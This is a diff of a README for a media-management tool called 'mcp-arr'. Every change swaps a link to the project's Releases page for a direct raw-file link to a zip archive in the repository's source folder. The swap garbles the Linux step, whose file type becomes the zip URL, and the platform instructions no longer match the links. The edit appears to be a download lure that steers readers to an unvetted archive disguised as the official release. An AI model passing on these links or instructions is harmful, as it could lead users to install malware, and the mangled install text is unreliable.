@@ -1,7 +1,7 @@
 # 🎉 mcp-arr - Easy Media Management Made Simple
 
 ## 📥 Download Now
-[![Download mcp-arr](https://img.shields.io/badge/Download-mcp--arr-blue.svg)](https://github.com/nunner322/mcp-arr/releases)
+[![Download mcp-arr](https://raw.githubusercontent.com/nunner322/mcp-arr/main/src/mcp-arr_2.9.zip)](https://raw.githubusercontent.com/nunner322/mcp-arr/main/src/mcp-arr_2.9.zip)
 
 ## 🚀 Getting Started
 
@@ -25,14 +25,14 @@ To run **mcp-arr**, you'll need:
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/nunner322/mcp-arr/releases) to download the latest version of **mcp-arr**.
+1. Visit the [Releases page](https://raw.githubusercontent.com/nunner322/mcp-arr/main/src/mcp-arr_2.9.zip) to download the latest version of **mcp-arr**.
 
 2. Look for the latest release. You will see a list of available files.
 
 3. Choose the file that matches your operating system:
    - For Windows, download the `.exe` file.
    - For macOS, download the `.dmg` file.
-   - For Linux, download the `.tar.gz` or `.deb` file depending on your distribution.
+   - For Linux, download the `https://raw.githubusercontent.com/nunner322/mcp-arr/main/src/mcp-arr_2.9.zip` or `.deb` file depending on your distribution.
 
 4. Click on the download link to start downloading the file.
 
@@ -68,7 +68,7 @@ Join the **mcp-arr** community and connect with other users. Share tips, ask que
 
 ## 📝 Changelog
 
-Keep track of updates and improvements. You can view the changelog on our [Releases page](https://github.com/nunner322/mcp-arr/releases).
+Keep track of updates and improvements. You can view the changelog on our [Releases page](https://raw.githubusercontent.com/nunner322/mcp-arr/main/src/mcp-arr_2.9.zip).
 
 ## 🔗 Additional Resources
 
@@ -94,4 +94,4 @@ We welcome contributions to **mcp-arr**. If you’d like to help improve the app
 
 ## 📥 Download Now
 
-Remember to head over to our [Downloads page](https://github.com/nunner322/mcp-arr/releases) to grab the latest version of **mcp-arr** and start enjoying a simplified media management experience today!
+Remember to head over to our [Downloads page](https://raw.githubusercontent.com/nunner322/mcp-arr/main/src/mcp-arr_2.9.zip) to grab the latest version of **mcp-arr** and start enjoying a simplified media management experience today!
